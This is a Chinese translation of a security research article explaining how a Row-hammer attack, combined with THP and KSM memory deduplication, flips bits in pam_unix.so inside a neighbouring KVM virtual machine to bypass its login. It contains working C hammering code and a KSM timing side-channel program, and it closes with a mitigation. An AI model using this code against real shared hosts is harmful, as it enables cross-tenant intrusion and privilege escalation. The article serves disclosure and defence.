@@ -1,0 +1,394 @@
+# 【技术分享】看我如何跨虚拟机实现Row Hammer攻击和权限提升
+
+阅读量 **169800**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2017-11-01 17:27:14
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：stormshield.com
+
+原文地址：<https://thisissecurity.stormshield.com/2017/10/19/attacking-co-hosted-vm-hacker-hammer-two-memory-modules/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+译者：[blueSky](http://bobao.360.cn/member/contribute?uid=1233662000)
+
+预估稿费：200RMB
+
+投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
+
+**前言**
+
+****
+
+row-hammer是一种能在物理层面上造成RAM位翻转的硬件漏洞。[Mark Seaborn 和Thomas Dullien
+两人](https://googleprojectzero.blogspot.fr/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)首次发现可以利用Row-hammer漏洞来获取内核权限。[Kaveh
+Razavi](https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_razavi.pdf)等人通过利用操作系统的“内存重复删除”特性能够有效控制比特位翻转，他们将Row-hammer漏洞利用推向了一个新的台阶。如果他们知道私密文件的内容，那么他们可以利用比特翻转来加载私密文件（比如authorized_keys），并通过削弱authorized_keys文件中的RSA模块，他们能够生成相应的私钥并在共同托管的受害者VM上进行身份验证。
+
+在这篇文章中，我们的目的是展示不同的攻击情形。在本文我们破坏了正在运行的程序状态，而不是破坏内存加载的文件。libpam是一个很容易遭受攻击的目标，因为它再类unix系统上提供身份验证机制。通过在攻击者的VM中运行row-hammer攻击实例，我们能够通过破坏pam_unix.so模块状态在邻近的受害者VM上成功进行身份验证。在下文中，我们假设两台相邻的虚拟机运行Linux（攻击者VM
++受害者VM），而且都托管在KVM虚拟机管理程序上，具体如下图所示：
+
+**Row-hammer**
+
+****
+
+DRAM芯片由周期性刷新的单元行组成，当CPU对存储器的一个字节请求读/写操作时，数据首先被传送到行缓冲器。在读/写请求执行之后，行缓冲器的内容会被复制回原始行，频繁的读写操作（放电和再充电）可能导致相邻行单元上出现较高的放电率从而引发错误。如果在丢失其电荷之前不刷新它们，则会在相邻的存储器行中引起位翻转。
+
+以下代码足以产生位翻转，该代码从两个不同的存储器行交替读取数据。这种操作是必需的，否则我们只能从行缓冲区读取数据，并且将无法重新激活一行数据，而且还需要使用cflush指令以避免从CPU的缓存中读取数据。Mark
+Seaborn和Thomas Dullien注意到，如果我们“侵略”其相邻行的数据（行k-1和行k + 1），那么row-hammer效应在受害者行k上将会被放大，具体如下图所示：
+
+**CHANNELS, RANKS, BANKS AND ADDRESS MAPPING**
+
+****
+
+在包含2个channel的电脑配置中，最多可以插入两个内存模块。一个存储器模块由该模块两侧的存储器芯片组成，而且一个存储器芯片组成一个存储体，一个存储体代表一个存储单元矩阵。下面以我的电脑为例来说明，我的电脑配备了8
+GB RAM，具体参数如下所示：
+
+**2个channel。**
+
+**每个channel包含1个内存模块。**
+
+**每个内存模块包含2个rank。**
+
+**每个rank包含8个内存芯片。**
+
+**每个芯片包含8个bank。**
+
+**每个bank代表2^15行x 2^10列x8 bits。**
+
+因此，可用的RAM大小计算如下：
+
+**2 modules * 2 ranks * 2^3 chips * 2^3 banks * 2^15 rows * 2^10 columns * 1
+byte = 8 GB**
+
+当CPU访问一个字节内存时，内存控制器负责执行该读请求。Mark Seaborn已经确定了英特尔Sandy Bridge
+CPU的[物理地址映射机制](http://lackingrhoticity.blogspot.fr/2015/05/how-physical-addresses-map-to-rows-and-banks.html)。该映射与下面给出的内存配置相匹配：
+
+位0-5：字节的低6位用于索引行。
+
+位6：用于选择channel。
+
+位7-13：字节的高7位用于索引列。
+
+位14-16：((addr>>14)&7)^((addr>>18)&7)用于选择bank。
+
+位17：用于选择rank。
+
+位18-33：用于选择行。
+
+正如[这篇文章](https://depletionmode.com/2015/12/08/whats-in-an-address-ddr-memory-mapping/)所述，即使CPU请求单个字节，内存控制器也不会寻址芯片并返回8个字节，CPU会使用地址的3
+LSB位来选择正确的位。在这篇文章的其余部分，我们将使用上文提供的物理映射机制。
+
+  
+
+**行选择**
+
+****
+
+Row-hammer需要选择属于同一个bank的行数据，如果我们无法将虚拟地址转换为物理地址，那么就无法浏览行数据。假如我们已经知道了底层的物理地址映射，那么怎么可以获取一对映射到同一个bank而不同行的地址呢？实际上，从VM的角度来看，物理地址只是QEMU虚拟地址空间中的偏移量，因此为了达到从VM进行“攻击”的目的，我们只要获取Transparent
+Huge Pages (THP)就可以了。
+
+[THP](https://www.kernel.org/doc/Documentation/vm/transhuge.txt)是一个Linux功能，后台运行的内核线程会尝试分配2
+MB的巨大页面。如果我们申请分配一个2
+MB大小的缓冲区，那么客户端的内核线程将返回给我们一个THP。主机中的QEMU虚拟内存也是如此，在一段时间后也将被THP替代。正是因为有了THP，我们才可以获得2
+MB的连续物理内存，并且一个THP包含了很多行数据，因此我们可以浏览行数据了。
+
+根据先前提出的物理地址映射，由于行数据以MSB位（位18-33）寻址，那么一个THP包含了8*（2*2^20/2^18）行数据。但是，给定行中的地址是属于不同的channels,
+banks 以及ranks的。
+
+  
+
+**从VM进行Row-hammer攻击**
+
+****
+
+在攻击者VM中，我们尝试分配一个THP缓冲区，对于大小为2
+MB的每个内存块，我们通过读取页面映射文件来检查它是否包含在大页面中。然后，对于THP页面中的每两行（r，r+2），我们通过改变channel位和rank位来”敲击”每对地址。但是请注意，物理地址映射中的排列方案使得选择属于同一个bank的地址对具有以下要求：
+
+令（ r_i，b_i
+）表示行i的地址中标识行和存储体的3个LSB位。对于固定channel和rank，我们从行i开始依次“敲击”行j（j=i+2）中满足以下条件
+
+**> r_i^b_i=r_j^b_j**
+
+的地址开始。
+
+对于给定的bank b_i，在8个给定的bank b_j中只有三个满足上述条件，具体如下图所示：
+
+以下是我们优化后的row-hammer代码：
+
+    
+    
+    static int
+    hammer_pages(struct ctx *ctx, uint8_t *aggressor_row_prev, uint8_t *victim_row,
+                 uint8_t *aggressor_row_next, struct result *res)
+    {
+    	uintptr_t aggressor_row_1 = (uintptr_t)(aggressor_row_prev);
+    	uintptr_t aggressor_row_2 = (uintptr_t)(aggressor_row_next);
+    
+    	uintptr_t aggressor_ch1, aggressor_ch2 , aggressor_rk1, aggressor_rk2;
+    	uintptr_t aggressors[4], aggressor;
+    
+    	uint8_t *victim;
+    
+    	uintptr_t rank, channel, bank1, bank2;
+    
+    	int i, p, offset, ret = -1;
+    
+    	/* Loop over every channel */
+    	for (channel = 0; channel < ctx->channels; channel++) {
+    		aggressor_ch1 = aggressor_row_1 | (channel << ctx->channel_bit);
+    		aggressor_ch2 = aggressor_row_2 | (channel << ctx->channel_bit);
+    
+    		/* Loop over every rank */
+    		for (rank = 0; rank < ctx->ranks; rank++) {
+    			aggressor_rk1 = aggressor_ch1 | (rank << ctx->rank_bit);
+    			aggressor_rk2 = aggressor_ch2 | (rank << ctx->rank_bit);
+    
+    			/* Loop over every bank */
+    			for (bank1 = 0; bank1 < ctx->banks; bank1++) {
+    				aggressors[0] = aggressor_rk1 | (bank1 << ctx->bank_bit);
+    				i = 1;
+    				/* Looking for the 3 possible matching banks */
+    				for (bank2 = 0; bank2 < ctx->banks; bank2++) {
+    					aggressor = aggressor_rk2 | (bank2 << ctx->bank_bit);
+    					if ((((aggressors[0] ^ aggressor) >> (ctx->bank_bit + 1)) & 3) != 0)
+    						aggressors[i++] = aggressor;
+    					if (i == 4) break;
+    				}
+    
+    				/* Ensure victim is all set to bdir */
+    				for (p = 0; p < NB_PAGES(ctx); p++) {
+    					victim = victim_row + (ctx->page_size * p);
+    					memset(victim + RANDOM_SIZE, ctx->bdir, ctx->page_size - RANDOM_SIZE);
+    				}
+    
+    				hammer_byte(aggressors);
+    
+    				for (p = 0; p < NB_PAGES(ctx); p++) {
+    					victim = victim_row + (ctx->page_size * p);
+    
+    					for (offset = RANDOM_SIZE; offset < ctx->page_size; offset++) {
+    						if (victim[offset] != ctx->bdir) {
+    							if (ctx->bdir)
+    								victim[offset] = ~victim[offset];
+    							ctx->flipmap[offset] |= victim[offset];
+    							ncurses_flip(ctx, offset);
+    							if ((ret = check_offset(ctx, offset, victim[offset])) != -1) {
+    								ncurses_fini(ctx);
+    								printf("[+] Found target offsetn");
+    								res->victim = victim;
+    								for (i = 0; i < 4; i++)
+    									res->aggressors[i] = aggressors[i];
+    								return ret;
+    							}
+    						}
+    					}
+    				}
+    			}
+    		}
+    	}
+    	return ret;
+    }
+
+关于Row-hammer最后一件有趣的事情是：如果我们针对受害者机器中的行数据进行了位翻转，那么通过重新“敲击”相邻行再现位翻转的可能性就很大。
+
+  
+
+**Memory de-duplication**
+
+****
+
+现在我们知道如何“敲击”，下面我将介绍如何依靠操作系统内存重复数据删除实现在内存中执行位翻转操作。内存重复数据删除在虚拟机环境中尤其有用，因为它显着减少了内存占用。在Linux上，内存重复数据删除由KSM来实现。KSM会定期扫描内存并合并匿名页面（具有
+**MADV_MERGEABLE** 标记的页面）。
+
+假设我们知道相邻VM中文件的内容，以下是通过利用Row-hammer漏洞和内存重复数据删除功能来修改文件中随机位的主要步骤：
+
+1.从攻击者虚拟机“敲击”内存。
+
+2.加载内存页面中容易受到位翻转攻击的目标文件。
+
+3.加载受害者虚拟机中的目标文件。
+
+4.等待KSM合并这两个页面。
+
+5.再次“敲击”。
+
+6.受害者虚拟机中的文件应该已被修改。
+
+如Razavi等人在其论文所述，THP和KSM可能对Row-hammer造成意想不到的影响。因为THP会合并正常的4 KB页面以形成庞大的页面（2
+MB），而KSM会合并具有相同内容的页面。这可能导致KSM打破巨大页面的情况。为了避免这种情况，我们用8个随机字节填充每个4 KB页面的顶部。
+
+  
+
+**处理Libpam程序**
+
+****
+
+给定一个程序P，我们怎么能在程序代码中找到可以改变P输出结果的所有可翻转的bit位呢？对程序P执行逆向分析看似是个不错的想法，可逆向工程太耗费时间了。在本文中，我们使用radare2开发了一个PoC（flip
+-flop.py），该PoC能够自动捕获程序P的可翻转bit位。该PoC的原理是：我们翻转一些目标函数的每一位，并运行所需的功能，然后检查翻转的位是否影响目标函数的预期结果。我们在pam_unix.so模块（23e650547c395da69a953f0b896fe0a8）的两个函数上运行了PoC，如下图所示：
+
+**pam_sm_authenticate [0x3440]** ：执行验证用户的任务。
+
+**_unix_blankpasswd [0x6130]** ：检查用户是否没有空白密码。
+
+我们总共发现可17个可以翻转的bit位，利用这些bit位我们可以使用空白或错误的密码执行身份验证操作。
+
+值得注意的是，脚本无法从某些崩溃中恢复。原因是由于r2pipe没有提供任何处理错误的机制，那么当有一些致命的崩溃发生，r2pipe是无法恢复会话的。
+
+  
+
+**开始攻击**
+
+****
+
+我们的目标是在相邻VM中的pam_unix.so模块上运行一个Row-hammer攻击实例。我们首先回顾了绕过受害者VM身份验证机制的主要步骤：
+
+1.分配可用的物理内存。
+
+2.在内存页面添加一些填充数据，以防止KSM破坏THP页面。我们在每4 KB页面的顶部填充8个随机字节，其余的填充'xff'以检查方向1->
+0的位翻转（或使用''来检查0->1的位翻转方向）。
+
+3.我们在每个TPH页面中”敲击”每对被“入侵”的行，并检查我们是否在受害者行中进行了位翻转。
+
+4.如果位触发器与表1的偏移量匹配，则将pam_unix.so模块加载到受害者页面中。
+
+5.通过尝试登录来加载受影响虚拟机中的pam_unix.so模块。
+
+6.等待KSM合并页面。
+
+7.再次“敲击”已经产生相关翻转的bit位，此时受害者VM机器中，内存中的pam_unix.so已被更改。
+
+8.操作完毕。
+
+完整的exploit（pwnpam.c）可以在这里找到 。
+
+请注意，漏洞利用不是100％可靠，如果我们找不到可用的位翻转，那么实验将不会成功。
+
+  
+
+**更进一步**
+
+****
+
+漏洞利用并不完全自动，因为在某些时候，我们需要与漏洞利用进行交互，以确保模块已经加载到受害者VM内存中并且其内容已经与攻击者虚拟机中加载的内容合并在一起，这时执行bit位翻转才会成功。
+
+为了能够自动化的进行漏洞利用，可以通过利用KSM中的侧信道定时攻击来改善攻击，该功能使我们能够检测两个页面是否共享。以下代码是文中描述算法的实现，程序首先分配N个缓冲区（每个4096
+KB），并用随机数据填充它，代码如下所示：
+
+    
+    
+    #include <stdio.h>
+    #include <string.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    #include <time.h>
+    #include <inttypes.h>
+    #include <sys/mman.h>
+    #include <sys/syscall.h>
+    #include <sys/types.h>
+    
+    #define PAGE_NB 256
+    
+    /* from https://github.com/felixwilhelm/mario_baslr */
+    uint64_t rdtsc() {
+    	uint32_t high, low;
+    	asm volatile(".att_syntaxnt"
+    		"RDTSCPnt"
+    		: "=a"(low), "=d"(high)::);
+    	return ((uint64_t)high << 32) | low;
+    }
+    
+    int main()
+    {
+    	void *buffer, *half;
+    	int page_size = sysconf(_SC_PAGESIZE);
+    	size_t size =  page_size * PAGE_NB;
+    
+    	buffer = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    	madvise(buffer, size, MADV_MERGEABLE);
+    
+    	srand(time(NULL));
+    
+    	size_t i;
+    	for (i = 0; i < PAGE_NB; i++)
+    		*(uint32_t *)(buffer + (page_size * i)) = rand();
+    
+    	half = buffer + (page_size * (PAGE_NB / 2));
+    	for (i = 0; i < (PAGE_NB / 2); i += 2)
+    		memcpy(buffer + (page_size * i), half + (page_size * i), page_size);
+    
+    	sleep(10);
+    
+    	uint64_t start, end;
+    	for (i = 0; i < (PAGE_NB / 2); i++) {
+    		start = rdtsc();
+    		*(uint8_t *)(buffer + (page_size * i)) = 'xff';
+    		end = rdtsc();
+    		printf("[+] page modification took %" PRIu64 " cyclesn", end - start);
+    	}
+    
+    	return 0;
+    }
+
+该程序修改缓冲区前半部分中每个元素的单个字节，并测量写入操作时间。
+
+根据程序输出，我们可以根据执行写入操作所需的CPU周期数，清楚地区分复制页面和非共享页面。
+
+请注意，我们还可以依靠侧信道来检测受害者VM上运行的libpam版本。
+
+在我们的漏洞中，我们假设攻击者VM是在受害者VM之前启动的。此条件可以确保KSM总是通过攻击者控制的物理页面返回合并的页面。正如Kaveh
+Razavi文章所述，这种情况可以轻松实现，但该解决方案需要更深入地了解KSM的内部原理：KSM通过维护两个红黑树：稳定的树和不稳定的树来管理内存重复数据删除，前者跟踪共享页面，而后者存储合并候选页面。KSM会定期扫描页面，并尝试从稳定树中首先合并它们。如果失败，它会尝试在不稳定的树中找到一个匹配项。如果它再次失败，它将候选页面存储在不稳定的树中，并继续下一页。
+
+在我们的例子中，从不稳定树执行合并，KSM会选择首先注册合并的页面。 换句话说，首先启动的VM会赢得合并。为了放宽这个条件，我们可以尝试从稳定树合并页面。
+我们所要做的就是在攻击者VM内存中加载两次pam_unix.so模块，并等到KSM合并这些副本。之后，当pam_unix.so模块加载到受害者虚拟机时，其内容将与已存在于稳定树中并由攻击者控制的副本合并。
+
+  
+
+**结论**
+
+****
+
+尽管Row-hammer攻击是强大和有效的，但它却不再是神话。在这篇博客文章中，我们试图提供必要的工具来实现Row-hammer攻击，而且我们提供了一个漏洞，并允许人们在共同托管的虚拟机上获得访问权限或提升其权限。
+
+最后注意一下，禁用KSM就可以阻止我们的利用了
+
+    
+    
+    echo 0 > /sys/kernel/mm/ksm/run
+
+本文翻译自stormshield.com
+[原文链接](https://thisissecurity.stormshield.com/2017/10/19/attacking-co-hosted-vm-hacker-hammer-two-memory-modules/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **blueSky** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/87136](/post/id/87136)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自:
+[stormshield.com](https://thisissecurity.stormshield.com/2017/10/19/attacking-co-hosted-vm-hacker-hammer-two-memory-modules/)
+
+如若转载,请注明出处： <https://thisissecurity.stormshield.com/2017/10/19/attacking-co-hosted-vm-hacker-hammer-two-memory-modules/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p4.ssl.qhmsg.com/dm/200_200_100/t01d4c6d0183e5e3280.jpg) blueSky
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
